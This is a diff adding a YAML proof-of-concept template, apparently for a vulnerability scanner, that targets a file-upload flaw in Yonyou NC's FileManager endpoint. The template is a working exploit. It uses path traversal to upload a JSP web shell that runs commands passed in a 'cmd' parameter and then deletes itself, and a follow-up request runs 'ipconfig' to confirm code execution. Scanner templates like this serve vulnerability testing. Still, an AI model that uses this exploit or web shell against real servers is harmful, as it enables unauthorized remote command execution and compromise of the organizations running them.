@@ -1,0 +1,36 @@
+name: poc-yaml-yongyouNC-FileManager-File-upload
+transport: http
+  
+set:
+  username: randomLowercase(6)
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /portal/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&iscover=true&billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+        Content-Type: multipart/form-data; boundary=d0b7a0d40eed0e32904c8017b09eb305
+      body: " 
+        --d0b7a0d40eed0e32904c8017b09eb305\r\n\
+        Content-Disposition: form-data; name=\"file\"; filename=\"{{username}}.jsp\"\r\n\
+        Content-Type: text/plain\r\n\
+        \r\n\
+        <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print(\"<pre>\");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print(\"</pre>\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n\
+        --d0b7a0d40eed0e32904c8017b09eb305--\r\n\
+        "
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /{{username}}.jsp?cmd=ipconfig
+    expression: response.status == 200 && response.body.bcontains(b'Windows IP')
+expression: r0() && r1()
+
+
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486621&idx=1&sn=3089ccedabdffec2ea30d32190501c79&chksm=c267b9aef51030b89ce282109092e9d0c8e681cccc643e5a6723c5814617eeb53600df293984&token=522460222&lang=zh_CN#rd
